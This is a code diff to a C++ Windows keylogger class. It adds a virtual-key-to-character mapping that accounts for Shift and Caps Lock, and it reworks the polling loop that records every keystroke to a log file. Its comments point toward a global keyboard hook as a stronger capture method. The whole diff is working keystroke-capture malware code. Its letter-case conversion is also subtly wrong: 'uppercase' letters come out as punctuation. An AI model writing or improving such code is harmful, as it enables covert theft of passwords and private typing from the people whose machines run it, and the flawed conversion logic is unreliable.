@@ -33,7 +33,55 @@ void keylogger::LOG(const string &input)
         logFile << input;
     }
 }
+char VkCodeToChar(int vkCode) {
+    // A more robust implementation would handle Caps Lock,
+    // Num Lock, and other states.
+    bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
 
+    switch (vkCode) {
+        // Handle number keys with and without shift
+        case '0': return shift_pressed ? ')' : '0';
+        case '1': return shift_pressed ? '!' : '1';
+        case '2': return shift_pressed ? '@' : '2';
+        case '3': return shift_pressed ? '#' : '3';
+        case '4': return shift_pressed ? '$' : '4';
+        case '5': return shift_pressed ? '%' : '5';
+        case '6': return shift_pressed ? '^' : '6';
+        case '7': return shift_pressed ? '&' : '7';
+        case '8': return shift_pressed ? '*' : '8';
+        case '9': return shift_pressed ? '(' : '9';
+
+        // Handle letter keys, accounting for shift/caps lock
+        case 'A' ... 'Z': { // This is a GNU extension, for MSVC use 'A': 'A', 'B': 'B', etc.
+            bool caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            if (shift_pressed == caps_lock) {
+                return static_cast<char>(vkCode); // Lowercase
+            } else {
+                return static_cast<char>(vkCode - 32); // Uppercase (A=65, a=97, difference is 32)
+            }
+        }
+        
+        // Handle punctuation keys
+        case VK_OEM_1: return shift_pressed ? ':' : ';';
+        case VK_OEM_2: return shift_pressed ? '?' : '/';
+        case VK_OEM_3: return shift_pressed ? '~' : '`';
+        case VK_OEM_4: return shift_pressed ? '{' : '[';
+        case VK_OEM_5: return shift_pressed ? '|' : '\\';
+        case VK_OEM_6: return shift_pressed ? '}' : ']';
+        case VK_OEM_7: return shift_pressed ? '"' : '\'';
+        case VK_OEM_PERIOD: return shift_pressed ? '>' : '.';
+        case VK_OEM_COMMA: return shift_pressed ? '<' : ',';
+        case VK_OEM_MINUS: return shift_pressed ? '_' : '-';
+        case VK_OEM_PLUS: return shift_pressed ? '+' : '=';
+        
+        // Handle spaces and other keys
+        case VK_SPACE: return ' ';
+        case VK_TAB: return '\t';
+        
+        default:
+            return 0; // Return a null character for unhandled keys
+    }
+}
 // Handle special keys
 bool keylogger::HandleSpecialKey(int keyCode)
 {
@@ -96,28 +144,25 @@ void keylogger::Keylogger()
 
     LOG("\n[Keylogger Started]\n");
 
-    while (keyloggerON)
-    {
-        if (keyloggerRunning)
-        {
+   
+    while (keyloggerON) {
+        if (keyloggerRunning) {
             Sleep(10); // Avoid CPU overuse
 
-            for (int key = 8; key <= 190; ++key)
-            {
-                if (GetAsyncKeyState(key) & 0x8000)
-                {
-                    if (!HandleSpecialKey(key))
-                    {
-                        if (IsPrintable(key))
-                        {
-                            LOG(string(1, static_cast<char>(key)));
-                        }
+            // The loop for keys should be more targeted or use a different approach.
+            // A more effective method is to use a global keyboard hook (SetWindowsHookEx).
+            // This is a simplified loop that checks common key codes.
+            for (int key = 8; key <= 255; ++key) {
+                if (GetAsyncKeyState(key) & 0x8000) {
+                    char c = VkCodeToChar(key);
+                    if (c != 0) {
+                        LOG(std::string(1, c));
+                    } else {
+                        HandleSpecialKey(key);
                     }
                 }
             }
-        }
-        else
-        {
+        } else {
             Sleep(100);
         }
     }
